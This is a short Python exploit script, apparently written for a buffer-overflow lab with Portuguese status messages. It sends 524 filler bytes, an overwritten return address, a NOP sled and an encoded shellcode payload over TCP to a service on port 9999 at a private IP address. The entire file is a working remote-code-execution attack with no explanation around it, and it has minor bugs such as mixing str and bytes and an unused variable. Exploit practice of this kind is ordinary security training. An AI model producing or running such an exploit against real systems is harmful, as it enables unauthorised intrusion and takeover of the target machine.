

#!/usr/bin/env python

import socket

overflow = 'A' * 524

eip = '\xF7\xF8\x71\x75'

buf =  b""
buf += b"\xda\xda\xd9\x74\x24\xf4\xb8\xd8\xee\xe3\x49\x5e"
buf += b"\x29\xc9\xb1\x59\x31\x46\x19\x03\x46\x19\x83\xee"
buf += b"\xfc\x3a\x1b\x1f\xa1\x35\xe4\xe0\x32\x29\xd4\x32"
buf += b"\xbb\x4c\x72\x38\xee\xbe\xf0\x6c\x03\x35\x54\x85"
buf += b"\x90\x3b\x71\xaa\x11\xf1\xa7\x85\xa2\x34\x68\x49"
buf += b"\x60\x57\x14\x90\xb5\xb7\x25\x5b\xc8\xb6\x62\x2d"
buf += b"\xa6\x57\x3e\xf9\xc3\xf5\xaf\x8e\x96\xc5\xce\x40"
buf += b"\x9d\x75\xa9\xe5\x62\x01\x05\xe7\xb2\x62\xcd\xc7"
buf += b"\x33\xa7\xbe\x8c\x7c\x5f\xba\x5a\x08\x63\x8d\x6d"
buf += b"\x0e\x10\x39\x05\xf1\xf0\x73\xd9\x5e\x3d\xbc\xd4"
buf += b"\x9f\x7a\x7b\x07\xea\x70\x7f\xba\xed\x43\xfd\x60"
buf += b"\x7b\x53\xa5\xe3\xdb\xb7\x57\x27\xbd\x3c\x5b\x8c"
buf += b"\xc9\x1a\x78\x13\x1d\x11\x84\x98\xa0\xf5\x0c\xda"
buf += b"\x86\xd1\x55\xb8\xa7\x40\x30\x6f\xd7\x92\x9c\xd0"
buf += b"\x7d\xd9\x0f\x06\x01\x22\xd0\x27\x5f\xb4\x1c\xea"
buf += b"\x60\x44\x0b\x7d\x12\x76\x94\xd5\xbc\x3a\x5d\xf0"
buf += b"\x3b\x4b\x49\x03\x93\xf3\x1a\xfd\x14\x03\x32\x3a"
buf += b"\x40\x53\x2c\xeb\xe9\x38\xac\x14\x3c\xd4\xa6\x82"
buf += b"\x7f\x80\xb8\x54\xe8\xd2\xc6\x59\x53\x5b\x20\x09"
buf += b"\xf3\x0b\xfd\xea\xa3\xeb\xad\x82\xa9\xe4\x92\xb3"
buf += b"\xd1\x2f\xbb\x5e\x3e\x99\x93\xf6\xa7\x80\x68\x66"
buf += b"\x27\x1f\x15\xa8\xa3\x95\xe9\x67\x44\xdc\xf9\x90"
buf += b"\x33\x1e\x02\x61\xd6\x1e\x68\x65\x70\x49\x04\x67"
buf += b"\xa5\xbd\x8b\x98\x80\xbe\xcc\x67\x55\xf6\xa7\x5e"
buf += b"\xc3\xb6\xdf\x9e\x03\x36\x20\xc9\x49\x36\x48\xad"
buf += b"\x29\x65\x6d\xb2\xe7\x1a\x3e\x27\x08\x4a\x92\xe0"
buf += b"\x60\x70\xcd\xc7\x2e\x8b\x38\x54\x28\x73\xbe\x73"
buf += b"\x91\x1b\x40\xc4\x21\xdb\x2a\xc4\x71\xb3\xa1\xeb"
buf += b"\x7e\x73\x49\x26\xd7\x1b\xc0\xa7\x95\xba\xd5\xed"
buf += b"\x78\x62\xd5\x02\xa1\x95\xac\x6b\x56\x56\x51\x62"
buf += b"\x33\x57\x51\x8a\x45\x64\x87\xb3\x33\xab\x1b\x80"
buf += b"\x4c\x9e\x3e\xa1\xc6\xe0\x6d\xb1\xc2"


esp = 'C' * (1000 - 528)

print('[+] iniciado')
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.15.112",9999))

print('[+] Conectado')
data2 = sock.recv(1024)
sock.sendall(overflow + eip +'\x90' * 15 + buf)
sock.close()

print('[+] Foi enviado')
